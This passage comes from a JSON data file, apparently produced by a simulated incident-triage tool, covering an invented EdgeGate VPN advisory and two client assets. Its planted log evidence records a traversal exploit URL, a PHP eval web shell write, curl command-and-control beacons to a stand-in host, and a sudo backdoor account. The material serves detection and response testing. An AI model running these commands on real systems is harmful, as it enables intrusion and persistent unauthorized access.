    "asset": {
      "id": "ASSET-HARBOR-015",
      "host_name": "harbor-unkn-asset-01",
      "tenant_id": "harbor-logistics",
      "owner": "admin@harborlogistics.in",
      "product": "EdgeGate VPN",
      "version": "Unknown",
      "internet_facing": true,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.68",
      "exposure_tier": "emergency",
      "status": "needs_inventory",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-HARBOR-015",
      "overall_coverage": 0.987,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 44 of 45 days available",
        "ENDPOINT: Only 43 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-HARBOR-015",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 98% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-harbor-unkn-asset-01"
          ]
        }
      ],
      "coverage_score": 0.987,
      "coverage_report": {
        "asset_id": "ASSET-HARBOR-015",
        "overall_coverage": 0.987,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 44 of 45 days available",
          "ENDPOINT: Only 43 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.096402+00:00",
      "verdict_hash": "436a792f2cd07e2c51cf2f6ba9c3009c14027105277f3da247047d82955138bd"
    },
    "gate": {
      "asset_id": "ASSET-HARBOR-015",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.096406+00:00"
    },
    "clock": {
      "asset_id": "ASSET-HARBOR-015",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "emergency (12h)",
      "start_time": "2026-10-18T17:48:03.113028+00:00",
      "deadline_time": "2026-10-19T05:48:03.113028+00:00",
      "seconds_remaining": 43200,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-HARBOR-015-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-HARBOR-015",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate harbor-unkn-asset-01 (192.0.2.68) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-HARBOR-015",
      "root_node_id": "harbor-unkn-asset-01",
      "nodes": [
        {
          "id": "harbor-unkn-asset-01",
          "label": "harbor-unkn-asset-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "harbor-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "harbor-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "harbor-unkn-asset-01",
          "target": "harbor-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "harbor-unkn-asset-01",
          "target": "harbor-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "harbor-cred-vault",
          "target": "harbor-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "harbor-jump-host-01",
          "target": "harbor-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "harbor-dc-ad-01",
          "target": "harbor-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-LOTUS-001": {
    "asset": {
      "id": "ASSET-LOTUS-001",
      "host_name": "lotus-vpn-gw-01",
      "tenant_id": "lotus-clinics",
      "owner": "admin@lotusclinics.in",
      "product": "EdgeGate VPN",
      "version": "9.1.4",
      "internet_facing": true,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.19",
      "exposure_tier": "emergency",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [
      {
        "event_id": "EV-PLANTED-lotus-vpn-gw-01-01",
        "asset_id": "ASSET-LOTUS-001",
        "tenant_id": "lotus-clinics",
        "timestamp": "2026-10-04T03:45:00",
        "source_type": "web",
        "event_action": "crafted_request",
        "signal_class": "access",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-lotus-vpn-gw-01-01",
          "timestamp": "2026-10-04T03:45:00",
          "tenant_id": "lotus-clinics",
          "host_name": "lotus-vpn-gw-01",
          "source_type": "web",
          "event_action": "crafted_request",
          "user_name": "anonymous",
          "process_name": "edgegate_httpd",
          "process_cmdline": "/usr/sbin/edgegate_httpd -D FOREGROUND",
          "file_path": "/api/v1/auth/session",
          "http_method": "POST",
          "url_path": "/api/v1/auth/session?bypass=../../bin/sh",
          "status_code": 200,
          "src_ip": "203.0.113.195",
          "dst_ip": "192.0.2.19",
          "dst_port": 443,
          "network_bytes": 4096
        },
        "content_hash": "cbb2f1eaf27a4ea9371284d8ed8f6e9c96a832cf3d42c8cfa9cbf0e2ca19d13a"
      },
      {
        "event_id": "EV-PLANTED-lotus-vpn-gw-01-02",
        "asset_id": "ASSET-LOTUS-001",
        "tenant_id": "lotus-clinics",
        "timestamp": "2026-10-05T21:40:00",
        "source_type": "file",
        "event_action": "file_write_served_dir",
        "signal_class": "persistence",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-lotus-vpn-gw-01-02",
          "timestamp": "2026-10-05T21:40:00",
          "tenant_id": "lotus-clinics",
          "host_name": "lotus-vpn-gw-01",
          "source_type": "file",
          "event_action": "file_write_served_dir",
          "user_name": "www-data",
          "process_name": "sh",
          "process_cmdline": "/bin/sh -c 'echo <?php eval($_POST[x]); ?> > /var/www/html/assets/.sys_cache.php'",
          "file_path": "/var/www/html/assets/.sys_cache.php",
          "http_method": "N/A",
          "url_path": "N/A",
          "status_code": 0,
          "src_ip": "N/A",
          "dst_ip": "N/A",
          "dst_port": 0,
          "network_bytes": 1024
        },
        "content_hash": "5003f8fcaf2b838782588a3e6001078b55ab5063269292e3b1b970a575a766c8"
      },
      {
        "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-0",
        "asset_id": "ASSET-LOTUS-001",
        "tenant_id": "lotus-clinics",
        "timestamp": "2026-10-08T10:00:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-0",
          "timestamp": "2026-10-08T10:00:00",
          "tenant_id": "lotus-clinics",
          "host_name": "lotus-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.19",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "b85c4e122a1bf5c7f7588651c547749a7387d26dab7230d7c1a39d530641d709"
      },
      {
        "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-1",
        "asset_id": "ASSET-LOTUS-001",
        "tenant_id": "lotus-clinics",
        "timestamp": "2026-10-08T09:45:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-1",
          "timestamp": "2026-10-08T09:45:00",
          "tenant_id": "lotus-clinics",
          "host_name": "lotus-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.19",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "162b36fcd250bf264f43ce028e21b3ba2c6451f0d4eeaf30f5d36b223567f02c"
      },
      {
        "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-2",
        "asset_id": "ASSET-LOTUS-001",
        "tenant_id": "lotus-clinics",
        "timestamp": "2026-10-08T09:30:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-2",
          "timestamp": "2026-10-08T09:30:00",
          "tenant_id": "lotus-clinics",
          "host_name": "lotus-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.19",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "93b43abf3eb4d058785ff71be789335cfbc2a99f098c8e26e7d2dba84bc14930"
      },
      {
        "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-3",
        "asset_id": "ASSET-LOTUS-001",
        "tenant_id": "lotus-clinics",
        "timestamp": "2026-10-08T09:15:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-3",
          "timestamp": "2026-10-08T09:15:00",
          "tenant_id": "lotus-clinics",
          "host_name": "lotus-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.19",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "ed69ae7ac8f6f8502872aba5d9abeee2b90af035b933cdbbcd53b000a3c2e183"
      },
      {
        "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-4",
        "asset_id": "ASSET-LOTUS-001",
        "tenant_id": "lotus-clinics",
        "timestamp": "2026-10-08T09:00:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-4",
          "timestamp": "2026-10-08T09:00:00",
          "tenant_id": "lotus-clinics",
          "host_name": "lotus-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.19",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "ff4550178a5072b1cd495088853e4a7394dd70c8e0a81ea4ba8b807afd09e9ae"
      },
      {
        "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-5",
        "asset_id": "ASSET-LOTUS-001",
        "tenant_id": "lotus-clinics",
        "timestamp": "2026-10-08T08:45:00",
        "source_type": "network",
        "event_action": "periodic_egress_c2",
        "signal_class": "outbound_control",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-lotus-vpn-gw-01-03-5",
          "timestamp": "2026-10-08T08:45:00",
          "tenant_id": "lotus-clinics",
          "host_name": "lotus-vpn-gw-01",
          "source_type": "network",
          "event_action": "periodic_egress_c2",
          "user_name": "root",
          "process_name": "curl",
          "process_cmdline": "curl -s -k https://198.51.100.42:8443/checkin",
          "file_path": "N/A",
          "http_method": "CONNECT",
          "url_path": "/checkin",
          "status_code": 200,
          "src_ip": "192.0.2.19",
          "dst_ip": "198.51.100.42",
          "dst_port": 8443,
          "network_bytes": 512
        },
        "content_hash": "f2a4de782809b302a6167e86ab282f9b0b476b0000cae64881d7cefb96fb2b5e"
      },
      {
        "event_id": "EV-PLANTED-lotus-vpn-gw-01-04",
        "asset_id": "ASSET-LOTUS-001",
        "tenant_id": "lotus-clinics",
        "timestamp": "2026-10-10T17:15:00",
        "source_type": "auth",
        "event_action": "user_add_privileged",
        "signal_class": "privilege_change",
        "confidence": "high",
        "details": {
          "event_id": "EV-PLANTED-lotus-vpn-gw-01-04",
          "timestamp": "2026-10-10T17:15:00",
          "tenant_id": "lotus-clinics",
          "host_name": "lotus-vpn-gw-01",
          "source_type": "auth",
          "event_action": "user_add_privileged",
          "user_name": "root",
          "process_name": "useradd",
          "process_cmdline": "/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit",
          "file_path": "/etc/passwd",
          "http_method": "N/A",
          "url_path": "N/A",
          "status_code": 0,
          "src_ip": "N/A",
          "dst_ip": "N/A",
          "dst_port": 0,
          "network_bytes": 0
        },
        "content_hash": "32f5d3a0da905a059abd8d6151f1841e17b78481801dc062e2e4874a7df550c6"
      }
    ],
    "coverage": {
      "asset_id": "ASSET-LOTUS-001",
      "overall_coverage": 1.0,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        }
      ],
      "adequate": true,
      "blind_spots": [],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-LOTUS-001",
      "advisory_id": "SIM-2026-0001",
      "state": "Likely compromised",
      "confidence": "high",
      "reasons": [
        {
          "text": "Pre-authentication exploitation request observed on 2026-10-04T03:45:00 targeting /api/v1/auth/session?bypass=../../bin/sh matching known CVE bypass patterns.",
          "evidence_ids": [
            "EV-PLANTED-lotus-vpn-gw-01-01"
          ]
        },
        {
          "text": "Unauthorized web shell written to served web directory at /var/www/html/assets/.sys_cache.php by service account on 2026-10-05T21:40:00.",
          "evidence_ids": [
            "EV-PLANTED-lotus-vpn-gw-01-02"
          ]
        },
        {
          "text": "Periodic TLS command-and-control beaconing identified to non-standard destination 198.51.100.42:8443.",
          "evidence_ids": [
            "EV-PLANTED-lotus-vpn-gw-01-03-0",
            "EV-PLANTED-lotus-vpn-gw-01-03-1",
            "EV-PLANTED-lotus-vpn-gw-01-03-2",
            "EV-PLANTED-lotus-vpn-gw-01-03-3",
            "EV-PLANTED-lotus-vpn-gw-01-03-4",
            "EV-PLANTED-lotus-vpn-gw-01-03-5"
          ]
        },
        {
          "text": "Dormant administrative user created via command line '/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit' on 2026-10-10T17:15:00 to establish post-patch persistence.",
          "evidence_ids": [
            "EV-PLANTED-lotus-vpn-gw-01-04"
          ]
        }
      ],
      "coverage_score": 1.0,
      "coverage_report": {
        "asset_id": "ASSET-LOTUS-001",
        "overall_coverage": 1.0,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          }
        ],
        "adequate": true,
        "blind_spots": [],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.100985+00:00",
      "verdict_hash": "456d11e1c2febaaf3ac1361411fdd356e4d16dacf6730ebae98992daa40559f6"
    },
    "gate": {
      "asset_id": "ASSET-LOTUS-001",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Contain first then patch",
      "gate_locked": true,
      "required_roles": [
        "Incident_Lead",
        "Security_Approver"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.100988+00:00"
    },
    "clock": {
      "asset_id": "ASSET-LOTUS-001",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "emergency (12h)",
      "start_time": "2026-10-18T17:48:03.113053+00:00",
      "deadline_time": "2026-10-19T05:48:03.113053+00:00",
      "seconds_remaining": 43200,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-LOTUS-001-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-LOTUS-001",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate lotus-vpn-gw-01 (192.0.2.19) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
